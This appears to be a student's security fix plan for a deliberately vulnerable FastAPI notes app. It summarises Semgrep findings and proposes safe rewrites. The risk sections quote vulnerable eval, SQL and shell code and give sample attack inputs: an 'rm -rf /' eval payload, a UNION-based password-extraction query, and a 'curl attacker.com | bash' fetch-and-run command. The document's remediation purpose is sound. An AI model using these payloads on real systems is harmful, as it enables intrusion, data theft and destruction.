# Security Fix Plan for Week 6 Vulnerabilities

## Summary of Vulnerabilities from Semgrep Scan

Based on the Semgrep Code Findings CSV (`Semgrep_Code_Findings_2026_01_04.csv`), the following vulnerabilities were identified:

### Vulnerability Summary Table

| # | Severity | Category | Rule Name | File | Line | Description |
|---|----------|----------|-----------|------|------|-------------|
| 1 | **Critical** | Code Injection | `tainted-code-stdlib-fastapi` | `notes.py` | L104 | `eval()` with untrusted input - arbitrary code execution |
| 2 | **Critical** | SQL Injection | `generic-sql-fastapi` | `notes.py` | L33, L72, L80 | Unsanitized input in SQL queries |
| 3 | **Critical** | SQL Injection | `generic-sql-fastapi` | `action_items.py` | L33 | Unsanitized input in SQL queries |
| 4 | **Critical** | SQL Injection | `sqlalchemy-fastapi` | `notes.py` | L72 | SQLAlchemy text() with f-string |
| 5 | **Critical** | SQL Injection (aiosqlite) | `fastapi-aiosqlite-sqli` | `notes.py` | L33, L80 | SQL injection via aiosqlite |
| 6 | **Critical** | SQL Injection (aiosqlite) | `fastapi-aiosqlite-sqli` | `action_items.py` | L33 | SQL injection via aiosqlite |
| 7 | **High** | Path Traversal | `tainted-path-traversal-stdlib-fastapi` | `notes.py` | L128 | Arbitrary file read via path manipulation |
| 8 | **High** | Command Injection | `tainted-os-command-stdlib-fastapi` | `notes.py` | L112 | `subprocess.run` with `shell=True` and untrusted input |

### Unique Issues Identified (Grouped by Root Cause)

1. **Code Injection via `eval()`** - Line 104 in `notes.py`
2. **SQL Injection via raw SQL with f-strings** - Lines 71-80 in `notes.py` (`unsafe_search` function)
3. **Command Injection via `subprocess.run(shell=True)`** - Line 112 in `notes.py`
4. **Path Traversal via unsanitized file path** - Line 128 in `notes.py`
5. **SSRF-like risk via `urlopen()`** - Line 120 in `notes.py` (not flagged but related)

> **Note:** The SQL injection findings on `action_items.py` (L33) and `notes.py` (L33) appear to be **false positives**. These lines use SQLAlchemy ORM's `stmt.offset(skip).limit(limit)` which is safe parameterized query syntax. The flagged `notes.py` lines 72-80 in the `unsafe_search` function are the **true positive** SQL injection vulnerabilities.

---

## Selected 3 Issues for Remediation

Based on severity and impact, I recommend fixing these **3 critical issues**:

| Fix # | Issue | File:Line | Severity | Priority |
|-------|-------|-----------|----------|----------|
| 1 | **Code Injection via `eval()`** | `notes.py:104` | Critical | Highest |
| 2 | **SQL Injection via raw SQL** | `notes.py:69-92` | Critical | High |
| 3 | **Command Injection via `shell=True`** | `notes.py:108-113` | High | High |

---

## Fix #1: Code Injection via `eval()` (Critical)

### Current Vulnerable Code (Line 102-105)
```python
@router.get("/debug/eval")
def debug_eval(expr: str) -> dict[str, str]:
    result = str(eval(expr))  # noqa: S307
    return {"result": result}
```

### Risk Description
- **Attack Vector:** An attacker can pass arbitrary Python code as the `expr` parameter
- **Impact:** Complete server compromise - attackers can execute any Python code, read files, access environment variables, execute system commands, or install backdoors
- **Example Attack:** `GET /notes/debug/eval?expr=__import__('os').system('rm -rf /')`

### Remediation Strategy
**Use safe evaluation with AST parsing (Option B)**
- Replace dangerous `eval()` with a sandboxed expression evaluator
- Use `ast.parse()` to parse the expression into an Abstract Syntax Tree
- Only allow basic mathematical operations via a strict allowlist
- Reject any code constructs, function calls, or attribute access

### Proposed Change
```python
@router.get("/debug/eval")
def debug_eval(expr: str) -> dict[str, str]:
    """Safe mathematical expression evaluator - NO arbitrary code execution."""
    import ast
    import operator
    
    from fastapi import HTTPException
    
    # Only allow basic math operations
    SAFE_OPS = {
        ast.Add: operator.add,
        ast.Sub: operator.sub,
        ast.Mult: operator.mul,
        ast.Div: operator.truediv,
        ast.Pow: operator.pow,
        ast.USub: operator.neg,
    }
    
    def safe_eval(node):
        if isinstance(node, ast.Constant):
            # Only allow numeric constants
            if not isinstance(node.value, (int, float)):
                raise ValueError("Only numeric values allowed")
            return node.value
        elif isinstance(node, ast.BinOp):
            op = SAFE_OPS.get(type(node.op))
            if op is None:
                raise ValueError("Unsupported operation")
            return op(safe_eval(node.left), safe_eval(node.right))
        elif isinstance(node, ast.UnaryOp):
            op = SAFE_OPS.get(type(node.op))
            if op is None:
                raise ValueError("Unsupported operation")
            return op(safe_eval(node.operand))
        else:
            raise ValueError("Invalid expression - only basic math allowed")
    
    try:
        tree = ast.parse(expr, mode='eval')
        result = safe_eval(tree.body)
        return {"result": str(result)}
    except ValueError as e:
        raise HTTPException(status_code=400, detail=f"Invalid expression: {str(e)}")
    except SyntaxError:
        raise HTTPException(status_code=400, detail="Invalid expression syntax")
```

### Verification Steps
1. Re-run Semgrep to confirm the finding is resolved
2. Run existing tests: `make test`
3. Test that server still starts: `make run`

---

## Fix #2: SQL Injection via Raw SQL (Critical)

### Current Vulnerable Code (Lines 69-92)
```python
@router.get("/unsafe-search", response_model=list[NoteRead])
def unsafe_search(q: str, db: Session = Depends(get_db)) -> list[NoteRead]:
    sql = text(
        f"""
        SELECT id, title, content, created_at, updated_at
        FROM notes
        WHERE title LIKE '%{q}%' OR content LIKE '%{q}%'
        ORDER BY created_at DESC
        LIMIT 50
        """
    )
    rows = db.execute(sql).all()
    # ... rest of function
```

### Risk Description
- **Attack Vector:** User input `q` is directly interpolated into SQL string
- **Impact:** Attackers can read, modify, or delete any data in the database, or potentially execute OS commands depending on DB configuration
- **Example Attack:** `GET /notes/unsafe-search?q=' OR '1'='1' --` would bypass the LIKE filter and return all notes
- **Example Data Exfil:** `GET /notes/unsafe-search?q=' UNION SELECT password,password,password,null,null FROM users--`

### Remediation Strategy
**Use SQLAlchemy ORM with built-in parameterization**
- SQLAlchemy ORM methods like `contains()` automatically use parameterized queries
- No raw SQL construction with user input
- Type-safe and maintainable approach

### Proposed Change
```python
@router.get("/search", response_model=list[NoteRead])  # Renamed from unsafe-search
def search_notes(q: str, db: Session = Depends(get_db)) -> list[NoteRead]:
    """Safe search using SQLAlchemy ORM - parameterized automatically."""
    stmt = (
        select(Note)
        .where((Note.title.contains(q)) | (Note.content.contains(q)))
        .order_by(desc(Note.created_at))
        .limit(50)
    )
    rows = db.execute(stmt).scalars().all()
    return [NoteRead.model_validate(row) for row in rows]
```

> **Note:** This mirrors the existing safe `list_notes` function but provides explicit search functionality. The `contains()` method uses SQL `LIKE` with proper parameter binding under the hood.

### Verification Steps
1. Re-run Semgrep to confirm SQL injection findings are resolved
2. Run existing tests: `make test`
3. Test search functionality manually with special characters like `' OR 1=1 --`

---

## Fix #3: Command Injection via `shell=True` (High)

### Current Vulnerable Code (Lines 108-113)
```python
@router.get("/debug/run")
def debug_run(cmd: str) -> dict[str, str]:
    import subprocess

    completed = subprocess.run(cmd, shell=True, capture_output=True, text=True)  # noqa: S602,S603
    return {"returncode": str(completed.returncode), "stdout": completed.stdout, "stderr": completed.stderr}
```

### Risk Description
- **Attack Vector:** User-controlled `cmd` string is passed directly to shell
- **Impact:** Complete system compromise - attackers can execute ANY shell command with the web server's privileges
- **Example Attack:** `GET /notes/debug/run?cmd=cat /etc/passwd` or `cmd=curl attacker.com | bash`

### Remediation Strategy
**Use allowlist approach with `shell=False` (Option B)**
- Define a strict whitelist of allowed diagnostic commands
- Never use `shell=True` - prevents shell injection entirely
- Pass command arguments as a list, not a string
- Add timeout to prevent denial-of-service via hanging commands

### Proposed Change
```python
@router.get("/debug/run")
def debug_run(command: str) -> dict[str, str]:
    """Execute only predefined safe diagnostic commands."""
    import subprocess
    
    from fastapi import HTTPException
    
    # Strict allowlist of commands (no user-controlled arguments)
    ALLOWED_COMMANDS = {
        "uptime": ["uptime"],
        "date": ["date"],
        "hostname": ["hostname"],
        "whoami": ["whoami"],
        "pwd": ["pwd"],
    }
    
    if command not in ALLOWED_COMMANDS:
        raise HTTPException(
            status_code=400, 
            detail=f"Command not allowed. Allowed commands: {list(ALLOWED_COMMANDS.keys())}"
        )
    
    try:
        # Use shell=False (default) and pass args as list - prevents injection
        completed = subprocess.run(
            ALLOWED_COMMANDS[command], 
            capture_output=True, 
            text=True,
            timeout=10  # Prevent hanging
        )
        return {
            "returncode": str(completed.returncode), 
            "stdout": completed.stdout, 
            "stderr": completed.stderr
        }
    except subprocess.TimeoutExpired:
        raise HTTPException(status_code=408, detail="Command timed out")
```

### Verification Steps
1. Re-run Semgrep to confirm command injection finding is resolved
2. Run existing tests: `make test`
3. Test that server still starts: `make run`

---

## Migration: requirements.txt to uv

### Current State
The project has a `week6/requirements.txt` with outdated, vulnerable dependencies:
```txt
fastapi==0.65.2      # Old, has known vulnerabilities
uvicorn==0.11.8      # Old
sqlalchemy==1.3.23   # Old, not compatible with current code
pydantic==1.5.1      # Old, not compatible with current code
requests==2.19.1     # Has known vulnerabilities
PyYAML==5.1          # Has known vulnerabilities
Jinja2==2.10.1       # Has known vulnerabilities
MarkupSafe==1.1.0    # Old
Werkzeug==0.14.1     # Has known vulnerabilities
```

### Migration Steps

#### Step 1: Create `week6/pyproject.toml` for uv
```toml
[project]
name = "week6-security-demo"
version = "0.1.0"
description = "Week 6 Security Assignment - Note Taking App with Vulnerabilities"
requires-python = ">=3.10"
dependencies = [
    "fastapi>=0.111.0",
    "uvicorn[standard]>=0.30.0",
    "sqlalchemy>=2.0.0",
    "pydantic>=2.0.0",
    "requests>=2.32.0",
    "PyYAML>=6.0.1",
    "Jinja2>=3.1.3",
    "MarkupSafe>=2.1.5",
    "Werkzeug>=3.0.1",
]

[project.optional-dependencies]
dev = [
    "pytest>=8.0.0",
    "httpx>=0.27.0",
    "black>=24.1.0",
    "ruff>=0.4.0",
]

[tool.uv]
package = false
```

#### Step 2: Initialize uv and sync dependencies
```bash
cd week6
uv sync
```

#### Step 3: Update Makefile for uv
Replace the current Makefile with uv-compatible commands:
```makefile
.PHONY: run test format lint seed

run:
	uv run uvicorn backend.app.main:app --reload --host $${HOST:-127.0.0.1} --port $${PORT:-8000}

test:
	uv run pytest -q backend/tests

format:
	uv run black .
	uv run ruff check . --fix

lint:
	uv run ruff check .

seed:
	uv run python -c "from backend.app.db import apply_seed_if_needed; apply_seed_if_needed()"
```

#### Step 4: Remove old requirements.txt (optional)
After verifying `uv sync` works, the old `requirements.txt` can be removed or kept for reference.

---

## Implementation Checklist

### Step 1: uv Migration (Do First)
- [x] Create `week6/pyproject.toml` with updated dependencies
- [x] Run `cd week6 && uv sync` to install dependencies
- [x] Update `week6/Makefile` to use `uv run`
- [ ] Remove `week6/requirements.txt` (optional, keep for reference)

### Step 2: Pre-Implementation Verification
- [ ] Backup current code state: `git add . && git commit -m "pre-security-fix checkpoint"`
- [x] Verify tests pass with uv: `cd week6 && uv run pytest -q backend/tests`
- [x] Verify app runs with uv: `cd week6 && uv run uvicorn backend.app.main:app --reload`

### Step 3: Security Fixes
- [x] **Fix #1:** Secure `debug_eval` endpoint using safe AST-based evaluator
- [x] **Fix #2:** Replace `unsafe_search` with SQLAlchemy ORM query (renamed to `/search`)
- [x] **Fix #3:** Secure `debug_run` endpoint using command allowlist
- [ ] (Optional) Fix `debug_read` path traversal vulnerability
- [ ] (Optional) Fix `debug_fetch` SSRF vulnerability

### Verification
- [x] Run `make test` - all tests should pass (3 passed)
- [x] Run `make run` - app should start without errors
- [x] Run `semgrep scan` - fixed vulnerabilities resolved (only 1 remaining for optional debug_fetch)
- [x] Test fixed endpoints manually to ensure functionality

### Documentation
- [x] Fill out `week6/writeup.md` with fix details
- [x] Commit all changes with descriptive commit messages

---

## Appendix: False Positive Analysis

### Lines Flagged as SQL Injection (False Positives)

**`notes.py:33`** and **`action_items.py:33`**:
```python
rows = db.execute(stmt.offset(skip).limit(limit)).scalars().all()
```
- This uses SQLAlchemy ORM's fluent query builder
- `offset()` and `limit()` use parameter binding internally
- **Verdict:** False positive - SQLAlchemy handles parameterization

### Why Semgrep Flagged These
Semgrep's pattern matching detected:
1. User input (`skip`, `limit`) flowing into `db.execute()`
2. The broad rules catch any `db.execute()` with tainted data

However, SQLAlchemy's `offset()` and `limit()` methods properly sanitize integer inputs.

---

## Version Information

- **Plan Created:** 2026-01-04
- **Semgrep Scan Date:** 2026-01-03
- **Target Python Version:** >=3.10
- **Package Manager Transition:** requirements.txt → uv
